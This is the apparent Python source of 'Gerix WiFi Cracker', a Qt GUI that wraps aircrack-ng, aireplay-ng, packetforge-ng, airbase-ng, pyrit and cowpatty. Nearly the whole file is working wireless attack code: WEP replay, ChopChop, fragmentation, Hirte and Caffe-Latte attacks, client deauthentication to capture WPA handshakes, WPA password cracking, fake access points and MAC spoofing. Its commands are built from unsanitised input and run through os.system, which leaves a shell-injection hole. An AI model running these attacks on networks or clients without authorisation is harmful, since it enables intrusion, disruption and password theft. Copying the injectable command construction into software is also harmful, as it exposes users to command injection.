#!/usr/bin/python

import sys
import os
import time

from qt import *
from threading import Thread

from gerix_gui import *


# Global variables...

# program configuration directory
home_dir   = os.getenv('HOME')
config_dir = home_dir + '/.gerix-wifi-cracker/'

# default color terminal
def_term = 'xterm'

# main window
main_window = ''

#
# Thread for the asyncronous execution
# of commands
#
class Command_thread(Thread):
    def __init__ (self, command, init_message, end_message, use_term = True):
        Thread.__init__(self)
        self.command = command
        self.init_message = init_message
        self.end_message = end_message
        self.use_term = use_term

    def run(self):

        # print init_message
        if self.init_message!='':
            main_window.direct_output(self.init_message)

        # exec command
        print self.command

        # use terminal emulator?
        if self.use_term:
            x = os.system(def_term + " -e 'bash -c \"" + self.command + "; read\"'")
        else:
            x = os.system(self.command)
        exit_code = (x >> 8) & 0xFF

        # print end_message
        if self.end_message!='':
            main_window.output(self.end_message, exit_code)

#
# Thread for launching airodump-ng in background
#
class Airodump_thread(Thread):
    def __init__ (self, output_file, interface, bssid, channel):
        Thread.__init__(self)
        self.output_file = output_file
        self.interface = interface
        self.bssid = bssid
        self.channel = channel

    def run(self):
        os.system("airodump-ng -c " + self.channel + " --bssid " + self.bssid + " --output-format csv --write " + self.output_file + " " + self.interface)

#
# For the callbacks function
# extend Main_window class (that contains the GUI)
#
class Main_window_ex(Main_window):

    #
    # A little utility
    # a wrapper for the command echo
    #
    def echo(self, text, out_file):
        os.system('echo \'' + str(text) + '\' >> ' + str(out_file))

    #
    # Print the output in the GUI with a timestamp and with exit_code
    # this function should be used instead of other form of output printing
    #
    def output(self, out_text, exit_code):

        # print the output in the text_output widget (QTextEdit)

        # success
        if exit_code==0:
            self.text_output.append( '<b>' + time.strftime("%H:%M:%S", time.localtime()) + '</b> - ' + out_text + ' [<font color="#00aa00">Success</font>]')

        # failure
        else:
            self.text_output.append( '<b>' + time.strftime("%H:%M:%S", time.localtime()) + '</b> - ' + out_text + ' [<font color="#ff0000">Failure</font>]')


    #
    # Print the output in the GUI with a timestamp but without exit_code
    # this function should be used instead of other form of output printing
    #
    def direct_output(self, out_text):

        # print the output in the text_output widget (QTextEdit)
        self.text_output.append( '<b>' + time.strftime("%H:%M:%S", time.localtime()) + '</b> - ' + out_text)

    #
    # Autoload Access Point informations
    # in the "save informations" section
    #
    def slot_autoload_ap_info(self):

        # clear the QComboBox widgets
        self.combo_save_ap_mac.clear()
        self.combo_save_ap_name.clear()
        self.combo_save_ap_chan.clear()

        # save a file with the result of an iwlist scan
        os.system('ifconfig ' + self.periferica + ' up')
        os.system('iwlist ' + self.periferica + ' scan > /tmp/iwlist.txt')

        # AP MAC
        iwlist = os.popen('cat /tmp/iwlist.txt | grep "Address:" | awk \'{print $5}\'')
        for mac in iwlist.readlines():
            self.combo_save_ap_mac.insertItem(mac[:-1])
        iwlist.close()

        # AP ESSID
        iwlist = os.popen('cat /tmp/iwlist.txt | grep "ESSID:" | tr \':"\' \' \'  | sed "s/\s*ESSID\s*//" | sed "s/\s*$//"')
        for name in iwlist.readlines():
            self.combo_save_ap_name.insertItem(name[:-1])
        iwlist.close()

        # AP channel
        iwlist = os.popen('cat /tmp/iwlist.txt | grep "Channel:" | tr \':\' \' \' | awk \'{print $2}\'')
        for chan in iwlist.readlines():
            self.combo_save_ap_chan.insertItem(chan[:-1])
        iwlist.close()

    #
    # Capture replay packets (ARP request)
    #
    def slot_wep_capture_req(self):
        command = 'aireplay-ng -2 -b ' + self.ac + ' -d FF:FF:FF:FF:FF:FF -f 1 -m ' + self.mval + ' -n ' + self.nval + ' ' + self.mymon

        ct = Command_thread(command, '', 'ARP request attack: Capture replay packets with ' + self.mymon)

        ct.start()


    #
    # Crack WPA password dictionary
    #
    def slot_crack_wpa_aircrack(self):
        command = 'aircrack-ng -w ' + self.dfile + ' -b ' + self.ac + ' ' + config_dir + '*.cap'

        ct = Command_thread(command, 'Cracking WPA password with dictionary launched', '')

        ct.start()


    #
    # Crack WPA password pyrit
    #
    def slot_crack_wpa_pyrit(self):
        command = 'pyrit -e "' + self.essid + '" create_essid; pyrit -f ' + self.dfile2 + ' import_passwords; pyrit batchprocess; pyrit -e "' + self.essid + '" -f ' + config_dir + '/WPA_pyrit export_hashdb; aircrack-ng -r ' + config_dir + 'WPA_pyrit ' + config_dir + '*.cap'

        ct = Command_thread(command, 'Cracking WPA password with pyrit launched', '')

        ct.start()

    #
    # Restore original MAC Address
    #
    def slot_mac_restore(self):
        command = 'ifconfig ' + self.change_mac_int + ' down hw ether `cat ' + config_dir + '.macaddress-backup`; ifconfig ' + self.change_mac_int + ' up'

        ct = Command_thread(command, '', 'Restored original MAC address on interface ' + self.change_mac_int,  False)

        ct.start()

    #
    # Put the card in monitor mode
    #
    def slot_monitor_on(self):
        command = 'airmon-ng stop '  + self.periferica + '; airmon-ng start ' + self.periferica

        ct = Command_thread(command, '',  'Monitor on: ' + self.periferica,  False)

        ct.start()

        # update monitor mac address
        self.slot_autoload_mon_info()

    #
    # Start the wireless network mapping
    #
    def slot_net_map_on(self):
        
        # update monitor mac address
        self.slot_autoload_mon_info()
        
        command = 'airodump-ng ' + self.mymon

        ct = Command_thread(command, 'Network mapping with ' + self.mymon + ' launched', '')

        ct.start()

    #
    # Forged packet injection on the victim client (Client Fragmentation)
    #
    def slot_wep_arp_inj_cfrag(self):
        command = 'aireplay-ng -2 -r ' + config_dir + 'cfrag ' + self.mymon

        ct = Command_thread(command, '', 'Client Fragmentation attack: Inject arp packet with ' + self.mymon)

        ct.start()

    #
    # Forged packet injection on the victim access point (ChopChop)
    #
    def slot_wep_arp_inj_chop(self):
        command = 'aireplay-ng -2 -r ' + config_dir + 'output_FORGED ' + self.mymon

        ct = Command_thread(command, '', 'ChopChop attack: Inject arp packet with ' + self.mymon)

        ct.start()

    #
    # Forged packet injection on the victim access point (Fragmentation)
    #
    def slot_wep_arp_inj_frag(self):
        command = 'aireplay-ng -2 -r ' + config_dir + 'output_FORGED2 ' + self.mymon

        ct = Command_thread(command, '', 'Fragmentation attack: Inject arp packet with ' + self.mymon)

        ct.start()

    #
    # Associate with AP, use fake auth (Client Fragmentation)
    #
    def slot_wep_assoc_fake_auth_cfrag(self):
        command = 'aireplay-ng -1 0 -e "' + self.essid + '" -a ' + self.ac + ' -h ' + self.mymac + ' ' + self.mymon

        ct = Command_thread(command, '', 'Client Fragmentation attack: Fake auth with ' + self.mymon,  False)

        ct.start()

    #
    # Associate with AP, use fake auth (Fragmentation)
    #
    def slot_wep_assoc_fake_auth_frag(self):
        command = 'aireplay-ng -1 0 -e "' + self.essid + '" -a ' + self.ac + ' -h ' + self.mymac + ' ' + self.mymon

        ct = Command_thread(command, '', 'Fragmentation attack: Fake auth with ' + self.mymon,  False)

        ct.start()

    #
    # Associate with AP, use fake auth (ARP replay)
    #
    def slot_wep_assoc_fake_auth_rep(self):
        command = 'aireplay-ng -1 0 -e "' + self.essid + '" -a ' + self.ac + ' -h ' + self.mymac + ' ' + self.mymon

        ct = Command_thread(command, '', 'ARP replay attack: Fake auth with ' + self.mymon,  False)

        ct.start()

    #
    # Associate with AP, use fake auth (ARP request)
    #
    def slot_wep_assoc_fake_auth_req(self):
        command = 'aireplay-ng -1 0 -e "' + self.essid + '" -a ' + self.ac + ' -h ' + self.mymac + ' ' + self.mymon

        ct = Command_thread(command, '', 'ARP request attack: Fake auth with ' + self.mymon,  False)

        ct.start()

    #
    # Create the ARP packet to be injected on the victim access point (Client Fragmentation)
    #
    def slot_wep_create_arp_cfrag(self):
        command = 'packetforge-ng -o -a ' + self.ac + ' -h ' + self.ac_victim + ' -k 255.255.255.255 -l 255.255.255.255 -y ' + config_dir + '/*.xor -w ' + config_dir + 'cfrag'

        ct = Command_thread(command, '', 'Client Fragmentation attack: ARP packet created',  False)

        ct.start()

    #
    # Create the ARP packet to be injected on the victim access point (ChopChop)
    #
    def slot_wep_create_arp_chop(self):
        command = 'packetforge-ng -0 -a ' + self.ac + ' -h ' + self.mymac + ' -k 255.255.255.255 -l 255.255.255.255 -y ' + config_dir + '*.xor -w ' + config_dir + 'output_FORGED '

        ct = Command_thread(command, '', 'ChopChop attack: ARP packet created',  False)

        ct.start()

    #
    # Create the ARP packet to be injected on the victim self.access point (Fragmentation)
    #
    def slot_wep_create_arp_frag(self):
        command = 'packetforge-ng -o -a ' + self.ac + ' -h ' + self.mymac + ' -k 255.255.255.255 -l 255.255.255.255 -y ' + config_dir + '*.xor -w ' + config_dir + 'output_FORGED2'

        ct = Command_thread(command, '', 'Fragmentation attack: ARP packet created',  False)

        ct.start()

    #
    # Start false access point authentication on the victim (ChopChop attack)
    #
    def slot_wep_fake_auth_chop(self):
        command = 'aireplay-ng -1 0 -e "' + self.essid + '" -a ' + self.ac + ' -h ' + self.mymac + ' ' + self.mymon

        ct = Command_thread(command, '', 'ChopChop attack: Fake auth with ' + self.mymon,  False)

        ct.start()

    #
    # Start ChopChop attack
    #
    def slot_wep_start_chop(self):
        command = 'aireplay-ng -4 -h ' + self.mymac + ' ' + self.mymon

        ct = Command_thread(command, '', 'ChopChop attack started, using ' + self.mymon)

        ct.start()

    #
    # Start Fragmentation Attack
    #
    def slot_wep_start_frag(self):
        command = 'aireplay-ng -5 -b ' + self.ac + ' -h ' + self.mymac + ' ' + self.mymon

        ct = Command_thread(command, '', 'Fragmentation attack started, using ' + self.mymon)

        ct.start()

    #
    # Start ARP replay Attack
    #
    def slot_wep_start_rep(self):
        command = 'aireplay-ng -3 -b ' + self.ac + ' -h ' + self.mymac + ' ' + self.mymon

        ct = Command_thread(command, '', 'ARP replay attack started, using ' + self.mymon)

        ct.start()

    #
    # Start sniffing and logging
    #
    def slot_start_sniffing(self):
        dump_file = config_dir + 'sniff_dump'
        command = 'airodump-ng -c ' + self.canale + ' -w ' + dump_file  + ' --bssid ' + self.ac + ' ' + self.mymon

        ct = Command_thread(command, '', 'Sniffing and logging started with ' + self.mymon)

        ct.start()

    #
    # Performs a test of injection
    #
    def slot_wep_test_inj(self):
        command = 'aireplay-ng -9 ' + self.mymon

        ct = Command_thread(command, '', 'WEP: Injection test with ' + self.mymon)

        ct.start()

    #
    # Client deauthentication (WPA handshake)
    #
    def slot_wpa_deauth_hand(self):
        command = 'aireplay-ng -0 ' + self.deauth_WPA_num + ' -a ' + self.ac + ' -c ' + self.ac_victim_wpa + ' ' + self.mymon

        ct = Command_thread(command, '', 'WPA handshake attack: Client deauthentication with ' + self.mymon)

        ct.start()

    #
    # Performs a test of injection
    #
    def slot_wpa_test_inj(self):
        command = 'aireplay-ng -9 ' + self.mymon

        ct = Command_thread(command, '', 'WPA: Injection test with ' + self.mymon)

        ct.start()

    #
    # Clean all the old session files
    #
    def slot_gath_clean(self):
        command = 'rm -rf ' + config_dir + '*.cap ' + config_dir + '*.csv ' + config_dir + '*.xor' + config_dir + '*.netxml'

        ct = Command_thread(command, '', 'Logs cleaned',  False)

        ct.start()


    #
    # WPA Rainbow Tables Cracking
    #
    def slot_crack_wpa_rainbow_tables(self):
        command = 'cowpatty -r ' + config_dir + '*.cap -d ' + self.rtablesfile1 + ' -s "' + self.essid + '"'

        ct = Command_thread(command, 'Cracking WPA with rainbow tables launched',  '')

        ct.start()

    #
    # Aircrack decript WEP password
    #
    def slot_crack_wep_aircrack(self):
        command = 'aircrack-ng -z -b ' + self.ac + ' ' + config_dir + '*.cap'

        ct = Command_thread(command, 'Cracking WEP with aircrack launched',  '')

        ct.start()

    #
    # Start Hirte attack ad-hoc mode
    #
    def slot_wep_start_hirte_adhoc(self):
        command = 'airbase-ng -c ' + self.canale + ' -e "' + self.essid + '" -N -A -W 1 ' + self.mymon

        ct = Command_thread(command, '',  'Hirte attack ad-hoc mode started with' + self.mymon)

        ct.start()

    #
    # Start Hirte attack self.access point mode
    #
    def slot_wep_start_hirte_ap(self):
        command = 'airbase-ng -c ' + self.canale + ' -e "' + self.essid + '" -N -W 1 ' + self.mymon

        ct = Command_thread(command, '',  'Hirte attack access point mode started with' + self.mymon)

        ct.start()

    #
    # Start Caffe-Latte attack
    #
    def slot_wep_start_latte(self):
        command = 'airbase-ng -c ' + self.canale + ' -e "' + self.essid + '" -L -W 1 ' + self.mymon

        ct = Command_thread(command, '',  'Caffe_Latte attack started with ' + self.mymon)

        ct.start()

    #
    # Start Fake Access Point
    #
    def slot_fake_ap_start(self):

        # get fake AP options
        ap_essid    = str(self.line_fake_ap_essid.text())
        ap_chan     = str(self.line_fake_ap_chan.text())
        ap_wep_key  = str(self.line_fake_ap_wep_key.text())

        ap_wep  = self.check_fake_ap_wep.isChecked()
        ap_wpa  = self.radio_fake_ap_wpa.isChecked()
        ap_wpa2 = self.radio_fake_ap_wpa2.isChecked()

        ap_adhoc      = self.check_fake_ap_adhoc_mode.isChecked()
        ap_hidden     = self.check_fake_ap_hidden_ssid.isChecked()
        ap_no_broad   = self.check_fake_ap_no_broadcast.isChecked()
        ap_rep_probes = self.check_fake_ap_all_probes.isChecked()

        # Note: 1=WEP40 2=TKIP 3=WRAP 4=CCMP 5=WEP104
        ap_wpa_type = 0
        if self.radio_fake_ap_wep40.isChecked():
            ap_wpa_type = 1
        if self.radio_fake_ap_tkip.isChecked():
            ap_wpa_type = 2
        if self.radio_fake_ap_wrap.isChecked():
            ap_wpa_type = 3
        if self.radio_fake_ap_ccmp.isChecked():
            ap_wpa_type = 4
        if self.radio_fake_ap_wep104.isChecked():
            ap_wpa_type = 5


        # prepare the command
        command = 'airbase-ng -e "' + ap_essid + '" -c ' + ap_chan
        if ap_wep:
            command += ' -W 1'
        if ap_wpa:
            command += ' -z ' + str(ap_wpa_type)
        if ap_wpa2:
            command += ' -Z ' + str(ap_wpa_type)
        if ap_wep_key!='':
            command += ' -w ' + ap_wep_key
        if ap_adhoc:
            command += ' -A'
        if ap_hidden:
            command += ' -X'
        if ap_no_broad:
            command += ' -y'
        if ap_rep_probes:
            command += ' -P'
        command += ' ' + self.mymon

        # launch
        ct = Command_thread(command, '',  'Fake access point started with ' + self.mymon)

        ct.start()

    #
    # Change mac address
    #
    def slot_mac_change(self):

        # backup of old MAC...
        os.system('if [ -e ' + config_dir + '.macaddress-backup ]; then echo ""; else ifconfig ' + self.change_mac_int + ' | grep HWaddr | sed \'s/^.*HWaddr //\' > ' + config_dir + '.macaddress-backup; fi')

        command = 'ifconfig ' + self.change_mac_int + ' down hw ether ' + self.change_mac_mac + '; ifconfig ' + self.change_mac_int + ' up'

        ct = Command_thread(command, '',  'Mac address of interface ' + self.change_mac_int + ' changed in ' + self.change_mac_mac,  False)

        ct.start()

    #
    # Enable ip forwarding
    #
    def slot_enable_ip_forward(self):

        command = 'echo 1 > /proc/sys/net/ipv4/ip_forward'

        ct = Command_thread(command, '',  'Enable IP forwarding',  False)

        ct.start()

    #
    # Autoload monitor interfaces
    #
    def slot_autoload_mon_info(self):
        
        # clear
        self.combo_save_mon.clear()
        
        # load interfaces
        airmon = os.popen("airmon-ng | grep -E 'mon|ath' | awk ' { print $1 } ' ")
        
        for intf in airmon.readlines():
                self.combo_save_mon.insertItem(intf[:-1])
        airmon.close()
    
    #
    # Autoload victim clients
    #
    def slot_autoload_victim_clients(self):
        output_file = '/tmp/airodump-dump'        
        
        # clear
        self.combo_wep_mac_cfrag.clear()
        self.combo_wpa_mac_hand.clear()
        os.system("rm " + output_file + "*")
        
        # load interfaces
        thr = Airodump_thread(output_file, self.mymon, self.ac, self.canale)
        thr.start()
        
        os.system("sleep 4; pgrep airodump-ng | tail -n 2 | xargs kill")
        
        # open dump file
        dump_file = os.popen("cat " + output_file + "* | grep Station -A 100 | grep 0 | tr ',' ' ' | awk ' { print $1 } '")
        for mac in dump_file.readlines():
            self.combo_wep_mac_cfrag.insertItem(mac[:-1])
            self.combo_wpa_mac_hand.insertItem(mac[:-1])
        dump_file.close()
        

    #
    # Callbacks for input field text changes
    # updates automagically the global variables...
    #

    def slot_gath_int(self):
        self.periferica = str(self.combo_gath_int.currentText())

    def slot_save_ap_chan(self):
        self.canale = str(self.combo_save_ap_chan.currentText())
        
        index = self.combo_save_ap_chan.currentItem()
        self.combo_save_ap_mac.setCurrentItem(index)
        self.combo_save_ap_name.setCurrentItem(index)

    def slot_save_ap_mac(self):
        self.ac = str(self.combo_save_ap_mac.currentText())
        
        index = self.combo_save_ap_mac.currentItem()
        self.combo_save_ap_name.setCurrentItem(index)
        self.combo_save_ap_chan.setCurrentItem(index)

    def slot_save_ap_name(self):
        self.essid = str(self.combo_save_ap_name.currentText())

        index = self.combo_save_ap_name.currentItem()
        self.combo_save_ap_mac.setCurrentItem(index)
        self.combo_save_ap_chan.setCurrentItem(index)

    def slot_save_mon(self):
        self.mymon = str(self.combo_save_mon.currentText())
        
        # return if empty
        if self.mymon=='':
            return

        # get monitor mac address
        ifconfig = os.popen("ifconfig " + self.mymon + " | grep HWaddr | awk ' { print $5 } ' | tr '-' ':'")
        current_mac = ifconfig.readline()
        ifconfig.close()
        current_mac = current_mac[:17]

        # set mac
        self.combo_save_mon_mac.setCurrentText(current_mac)
        self.mymac = current_mac

    def slot_save_mon_mac(self):
        self.mymac = str(self.combo_save_mon_mac.currentText())

    def slot_line_crack_wpa_dictionary(self):
        self.dfile = str(self.line_crack_wpa_dictionary.text())

    def slot_line_crack_wpa_dictionary_pyrit(self):
        self.dfile2 = str(self.line_crack_wpa_dictionary_pyrit.text())

    def slot_line_crack_wpa_rainbow_tables_file(self):
        self.rtablesfile1 = str(self.line_crack_wpa_rainbow_tables_file.text())

    def slot_line_gath_logs(self):
        self.config_dir = str(self.line_gath_logs.text())

    def slot_line_mac_change_int(self):
        self.change_mac_int = str(self.line_mac_change_int.text())

    def slot_line_mac_change_mac(self):
        self.change_mac_mac = str(self.line_mac_change_mac.text())

    def slot_line_wep_mac_cfrag(self):
        self.ac_victim = str(self.combo_wep_mac_cfrag.currentText())

    def slot_line_wpa_mac_hand(self):
        self.ac_victim_wpa = str(self.combo_wpa_mac_hand.currentText())

    def slot_line_wpa_deauth_hand(self):
        self.deauth_WPA_num = str(self.spin_wpa_deauth_hand.text())

    def slot_spin_wep_wired_req(self):
        self.mval = str(self.spin_wep_wired_req.value())

    def slot_spin_wep_wireless_req(self):
        self.nval = str(self.spin_wep_wireless_req.value())

    #
    # Fill input fields on program load
    #
    def fill_input_fields(self):

        # variables/gui input fields
        self.periferica     = ''
        self.mymon          = ''
        self.mymac          = ''
        self.ac             = ''
        self.canale         = ''
        self.essid          = ''
        self.mval           = ''
        self.nval           = ''
        self.ac_victim      = ''
        self.ac_victim_wpa  = ''
        self.deauth_WPA_num = ''
        self.dfile          = ''
        self.dfile2         = ''
        self.change_mac_int = ''
        self.change_mac_mac = ''
        self.rtablesfile1   = ''

        # Session file directory
        self.line_gath_logs.setText(config_dir)

        # Wireless interfaces
        iwconfig = os.popen('iwconfig 2>/dev/null | grep 802.11 | awk \' { print $1 } \'')
        for intf in iwconfig.readlines():
            self.combo_gath_int.insertItem(intf[:-1])
        iwconfig.close()

        # Monitor interfaces
        self.slot_autoload_mon_info()

        # Various directories
        self.line_crack_wpa_dictionary.setText(home_dir)
        self.line_crack_wpa_dictionary_pyrit.setText(home_dir)
        self.line_crack_wpa_rainbow_tables_file.setText(home_dir)

        # WPA deauth
        self.slot_line_wpa_deauth_hand()


#
# This function initialize the config directory
#
def init_config_dir():
    global def_term

    # check config dir
    if not os.path.exists(config_dir):
        os.mkdir(config_dir)
        os.system('zenity --info --window-icon=/usr/local/buc/icons/attenzione.png --title="Gerix WiFi" --text="Hello and Thanks for using Gerix Wifi Cracker this is the first run, and ~/.gerix-wifi is now created."')

    print '\nConfig directory OK\n'

#
# This function perform various checks
# on program load
#
def check_all():

    # check for root uid
    if not os.geteuid()==0:
        main_window.direct_output('<b>Error:</b> <font color="#ff0000">You should run this program as root! ;-D</font>')



#
# MAIN FUNCTION
# The program starts here
#
def main():
    global main_window

    app = QApplication(sys.argv)
    main_window = Main_window_ex()
    app.setMainWidget(main_window)

    # initialize config directory
    init_config_dir()

    # change working directory
    os.chdir(config_dir)

    # performs various checks
    check_all()
    
    # fill the GUI
    main_window.fill_input_fields()

    # show main windows
    main_window.show()

    # launch the GUI
    app.exec_loop()

main()

